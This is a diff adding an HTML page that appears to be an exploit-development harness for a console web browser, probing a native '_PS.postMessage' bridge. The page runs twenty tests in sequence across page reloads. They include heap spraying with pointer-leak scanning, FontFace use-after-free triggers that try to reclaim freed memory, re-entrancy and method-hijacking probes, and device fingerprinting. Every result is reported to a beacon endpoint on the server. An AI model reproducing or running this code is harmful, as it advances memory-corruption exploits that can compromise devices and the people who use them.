@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P844v6</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function bn(tag,data){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
+    x.send();
+  }catch(e){}
+}
+
+var KEY='p844v6_test';
+function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
+function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
+function clearTest(){try{localStorage.removeItem(KEY);}catch(e){}}
+
+var testNum=getTest();
+log('P844v6 BOOT test='+testNum);
+bn('P844v6-BOOT','test='+testNum);
+
+// ONLY tests that return strings from toString. NO throws, NO non-string returns.
+// NO proxy, NO symbol, NO wrong this. Those are ALL confirmed crashes.
+var TESTS=[
+  // T0: postMessage internal slots
+  function T0(){
+    var r=[];
+    try{r.push('name='+_PS.postMessage.name);}catch(e){r.push('nameErr');}
+    try{r.push('length='+_PS.postMessage.length);}catch(e){r.push('lenErr');}
+    try{r.push('proto='+String(Object.getPrototypeOf(_PS.postMessage)));}catch(e){r.push('protoErr:'+e.message);}
+    try{r.push('ctor='+_PS.postMessage.constructor.name);}catch(e){r.push('ctorErr');}
+    try{r.push('toStr='+_PS.postMessage.toString().substring(0,100));}catch(e){r.push('toStrErr:'+e.message);}
+    try{r.push('native='+(_PS.postMessage.toString().indexOf('[native code]')>=0));}catch(e){}
+    return r.join('|');
+  },
+  // T1: structuredClone + JSON of _PS
+  function T1(){
+    var r=[];
+    try{var c=structuredClone(_PS);r.push('clone='+typeof c+'|keys='+Object.keys(c).join(','));}catch(e){r.push('cloneErr:'+e.message);}
+    try{r.push('json='+JSON.stringify(_PS));}catch(e){r.push('jsonErr:'+e.message);}
+    return r.join('|');
+  },
+  // T2: Re-entrancy depth with string returns
+  function T2(){
+    var depths=[];
+    var depth=0;
+    var obj={toString:function(){
+      depth++;
+      depths.push(depth);
+      if(depth<=10){try{_PS.postMessage({toString:function(){depth++;depths.push(depth);return 'd'+depth;}});}catch(e){depths.push('e');}}
+      return 'depth-'+depth;
+    }};
+    _PS.postMessage(obj);
+    return 'max='+depth+'|seq='+depths.join(',');
+  },
+  // T3: toString that allocates and scans heap
+  function T3(){
+    var bufs=[];
+    var leaked='none';
+    var obj={toString:function(){
+      for(var i=0;i<200;i++)bufs.push(new ArrayBuffer(192));
+      for(var i=0;i<100;i++){var a=new Array(10000);a=null;}
+      for(var i=0;i<bufs.length;i++){
+        var bv=new BigUint64Array(bufs[i]);
+        for(var j=0;j<24;j++){
+          if(bv[j]!==0n){leaked='idx='+i+'/'+j+'=0x'+bv[j].toString(16);break;}
+        }
+        if(leaked!=='none')break;
+      }
+      return 'spray-done';
+    }};
+    _PS.postMessage(obj);
+    return 'leaked='+leaked+'|bufs='+bufs.length;
+  },
+  // T4: FontFace UAF OUTSIDE toString (baseline: does reclaim work?)
+  function T4(){
+    var H='none';var fabs=[];var nonzero=0;var allvals=[];
+    try{
+      var st=document.createElement('style');
+      st.textContent="@font-face{font-family:bb6;src:local(Arial);unicode-range:U+0042;}";
+      document.head.appendChild(st);
+      var face=new FontFace('f6',"local('Helvetica')",{unicodeRange:'U+0041'});
+      document.fonts.add(face);void face.loaded;
+      var ffired=false;
+      Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+        get:function(){if(ffired)return undefined;ffired=true;
+          st.remove();st.textContent='';st=null;
+          try{document.fonts.delete(this);}catch(e){}
+          document.body.offsetHeight;
+          fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+          try{document.fonts.check('1em bb6');}catch(e){}
+          document.body.offsetHeight;
+          return undefined;
+        },set:function(){}});
+      document.fonts.load('1em f6, bb6','AB');
+      for(var i=0;i<50;i++){var a=new Array(5000);a=null;}
+      document.body.offsetHeight;
+      for(var i=0;i<fabs.length;i++){
+        var bv=new BigUint64Array(fabs[i]);
+        for(var j=0;j<24;j++){
+          if(bv[j]!==0n){nonzero++;var hi=Number(bv[j]>>32n);
+            allvals.push(i+':'+j+'=0x'+bv[j].toString(16));
+            if(hi>0x100&&hi<0x7FFF&&H==='none')H='0x'+bv[j].toString(16);
+            if(allvals.length>=10)break;}
+        }if(allvals.length>=10)break;
+      }
+    }catch(e){H='err:'+e.message;}
+    return 'H='+H+'|nz='+nonzero+'|v='+allvals.join(';')+'|b='+fabs.length;
+  },
+  // T5: FontFace UAF INSIDE toString (critical)
+  function T5(){
+    var H='none';var fabs=[];var nonzero=0;var allvals=[];
+    var obj={toString:function(){
+      try{
+        var st=document.createElement('style');
+        st.textContent="@font-face{font-family:uu6;src:local(Arial);unicode-range:U+0042;}";
+        document.head.appendChild(st);
+        var face=new FontFace('uf6',"local('Helvetica')",{unicodeRange:'U+0041'});
+        document.fonts.add(face);void face.loaded;
+        var ffired=false;
+        Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+          get:function(){if(ffired)return undefined;ffired=true;
+            st.remove();st.textContent='';st=null;
+            try{document.fonts.delete(this);}catch(e){}
+            document.body.offsetHeight;
+            fabs=[];for(var i=0;i<80;i++)fabs.push(new ArrayBuffer(192));
+            try{document.fonts.check('1em uu6');}catch(e){}
+            document.body.offsetHeight;
+            return undefined;
+          },set:function(){}});
+        document.fonts.load('1em uf6, uu6','AB');
+        for(var i=0;i<50;i++){var a=new Array(5000);a=null;}
+        document.body.offsetHeight;
+        for(var i=0;i<fabs.length;i++){
+          var bv=new BigUint64Array(fabs[i]);
+          for(var j=0;j<24;j++){
+            if(bv[j]!==0n){nonzero++;var hi=Number(bv[j]>>32n);
+              allvals.push(i+':'+j+'=0x'+bv[j].toString(16));
+              if(hi>0x100&&hi<0x7FFF&&H==='none')H='0x'+bv[j].toString(16);
+              if(allvals.length>=10)break;}
+          }if(allvals.length>=10)break;
+        }
+      }catch(e){H='err:'+e.message;}
+      return 'UAF-H='+H;
+    }};
+    _PS.postMessage(obj);
+    return 'H='+H+'|nz='+nonzero+'|v='+allvals.join(';')+'|b='+fabs.length;
+  },
+  // T6: FontFace UAF x3 fonts (more aggressive)
+  function T6(){
+    var H='none';var fabs=[];var nonzero=0;var allvals=[];
+    var obj={toString:function(){
+      try{
+        for(var f=0;f<3;f++){
+          var st=document.createElement('style');
+          st.textContent="@font-face{font-family:mm6_"+f+";src:local(Arial);unicode-range:U+004"+(2+f)+";}";
+          document.head.appendChild(st);
+          var face=new FontFace('mf6_'+f,"local('Helvetica')",{unicodeRange:'U+0041'});
+          document.fonts.add(face);void face.loaded;
+          var ffired=false;
+          (function(s){Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+            get:function(){if(ffired)return undefined;ffired=true;s.remove();s.textContent='';
+              try{document.fonts.delete(this);}catch(e){}return undefined;},set:function(){}});})(st);
+          document.fonts.load('1em mf6_'+f+', mm6_'+f,'AB');
+        }
+        document.body.offsetHeight;
+        fabs=[];for(var i=0;i<128;i++)fabs.push(new ArrayBuffer(192));
+        document.body.offsetHeight;
+        for(var i=0;i<80;i++){var a=new Array(5000);a=null;}
+        document.body.offsetHeight;
+        for(var i=0;i<fabs.length;i++){
+          var bv=new BigUint64Array(fabs[i]);
+          for(var j=0;j<24;j++){
+            if(bv[j]!==0n){nonzero++;allvals.push(i+':'+j+'=0x'+bv[j].toString(16));
+              var hi=Number(bv[j]>>32n);
+              if(hi>0x100&&hi<0x7FFF&&H==='none')H='0x'+bv[j].toString(16);
+              if(allvals.length>=10)break;}
+          }if(allvals.length>=10)break;
+        }
+      }catch(e){H='err:'+e.message;}
+      return 'UAF3-H='+H;
+    }};
+    _PS.postMessage(obj);
+    return 'H='+H+'|nz='+nonzero+'|v='+allvals.join(';')+'|b='+fabs.length;
+  },
+  // T7: toString replace postMessage mid-call
+  function T7(){
+    var origPM=_PS.postMessage;
+    var replaced=false;
+    var obj={toString:function(){
+      try{Object.defineProperty(_PS,'postMessage',{value:function(){replaced=true;return 'hijacked';}});}catch(e){}
+      try{_PS.postMessage=function(){replaced=true;return 'h2';};}catch(e){}
+      return 'replace-attempted';
+    }};
+    var r;
+    try{r=origPM.call(_PS,obj);}catch(e){r='err:'+e.message;}
+    try{Object.defineProperty(_PS,'postMessage',{value:origPM});}catch(e){}
+    return 'replaced='+replaced+'|ret='+r;
+  },
+  // T8: String size threshold
+  function T8(){
+    var r=[];
+    try{_PS.postMessage('A'.repeat(10240));r.push('10K=ok');}catch(e){r.push('10K=err:'+e.message);}
+    try{_PS.postMessage('A'.repeat(102400));r.push('100K=ok');}catch(e){r.push('100K=err:'+e.message);}
+    try{_PS.postMessage('A'.repeat(1048576));r.push('1M=ok');}catch(e){r.push('1M=err:'+e.message);}
+    return r.join('|');
+  },
+  // T9: toString that does heap snapshot
+  function T9(){
+    var snap='none';
+    var obj={toString:function(){
+      try{snap=String(console.takeHeapSnapshot());}catch(e){snap='err:'+e.message;}
+      return 'snap-done';
+    }};
+    _PS.postMessage(obj);
+    return 'snap='+snap;
+  },
+  // T10: toString that reads _PS memory layout via WeakRef
+  function T10(){
+    var info=[];
+    var obj={toString:function(){
+      // Check WeakRef support
+      try{
+        var wr=new WeakRef(_PS);
+        info.push('weakref='+typeof wr.deref());
+      }catch(e){info.push('wrErr:'+e.message);}
+      // Check FinalizationRegistry
+      try{
+        var fr=new FinalizationRegistry(function(){});
+        fr.register(_PS,'ps-token');
+        info.push('finreg=ok');
+      }catch(e){info.push('frErr:'+e.message);}
+      // Performance.memory
+      try{
+        if(performance.memory)info.push('jsHeap='+performance.memory.usedJSHeapSize);
+        else info.push('noMem');
+      }catch(e){info.push('memErr:'+e.message);}
+      return 'info-done';
+    }};
+    _PS.postMessage(obj);
+    return info.join('|');
+  },
+  // T11: toString that does fetch to leak internal state
+  function T11(){
+    var result='none';
+    var obj={toString:function(){
+      // Try to get WebKit internals
+      try{
+        var c=document.createElement('canvas');
+        c.width=1;c.height=1;
+        var ctx=c.getContext('2d');
+        ctx.fillStyle='#FF0000';ctx.fillRect(0,0,1,1);
+        var data=ctx.getImageData(0,0,1,1).data;
+        result='canvas='+data[0]+','+data[1]+','+data[2]+','+data[3];
+      }catch(e){result='canvasErr:'+e.message;}
+      // Try to read process info
+      try{result+='|ua='+navigator.userAgent.substring(0,60);}catch(e){}
+      try{result+='|hw='+navigator.hardwareConcurrency;}catch(e){}
+      try{result+='|dm='+navigator.deviceMemory;}catch(e){}
+      return 'info-done';
+    }};
+    _PS.postMessage(obj);
+    return result;
+  },
+
+  // === CRASH ZONE: each type isolated ===
+  // T12: toString returns number 42
+  function T12(){try{return 'ret='+_PS.postMessage({toString:function(){return 42;}});}catch(e){return 'err:'+e.message;}},
+  // T13: toString returns boolean true
+  function T13(){try{return 'ret='+_PS.postMessage({toString:function(){return true;}});}catch(e){return 'err:'+e.message;}},
+  // T14: toString returns null
+  function T14(){try{return 'ret='+_PS.postMessage({toString:function(){return null;}});}catch(e){return 'err:'+e.message;}},
+  // T15: toString returns undefined
+  function T15(){try{return 'ret='+_PS.postMessage({toString:function(){return undefined;}});}catch(e){return 'err:'+e.message;}},
+  // T16: toString returns object
+  function T16(){try{return 'ret='+_PS.postMessage({toString:function(){return {x:1};}});}catch(e){return 'err:'+e.message;}},
+  // T17: toString returns array
+  function T17(){try{return 'ret='+_PS.postMessage({toString:function(){return [1,2,3];}});}catch(e){return 'err:'+e.message;}},
+  // T18: toString throws Error
+  function T18(){try{_PS.postMessage({toString:function(){throw new Error('boom');}});return 'noThrow';}catch(e){return 'threw='+e.message;}},
+  // T19: Proxy create only
+  function T19(){var p=new Proxy(_PS,{});return 'created='+typeof p;}
+];
+
+var NAMES=[
+  'T0-slots','T1-clone','T2-reentrant','T3-gcSpray',
+  'T4-uafBaseline','T5-uafToString','T6-uaf3fonts','T7-replacePm',
+  'T8-strSizes','T9-heapSnap','T10-weakref','T11-canvasInfo',
+  'T12-retNum','T13-retBool','T14-retNull','T15-retUndef','T16-retObj','T17-retArr',
+  'T18-throwErr','T19-proxyCreate'
+];
+
+function advance(){setTest(testNum+1);location.reload();}
+
+function runTest(){
+  if(testNum>=TESTS.length){
+    log('ALL '+TESTS.length+' TESTS COMPLETE');
+    bn('P844v6-DONE','all='+TESTS.length);
+    clearTest();
+    return;
+  }
+  var name=NAMES[testNum]||('T'+testNum);
+  log('Running '+name+'...');
+  bn('P844v6-'+name+'-PRE','starting');
+  try{
+    var result=TESTS[testNum]();
+    log(name+': '+result);
+    bn('P844v6-'+name+'-OK',String(result).substring(0,800));
+  }catch(e){
+    log(name+' EXCEPTION: '+e.message);
+    bn('P844v6-'+name+'-ERR',e.message);
+  }
+  advance();
+}
+
+setTimeout(runTest,200);
+</script>
+</body>
+</html>
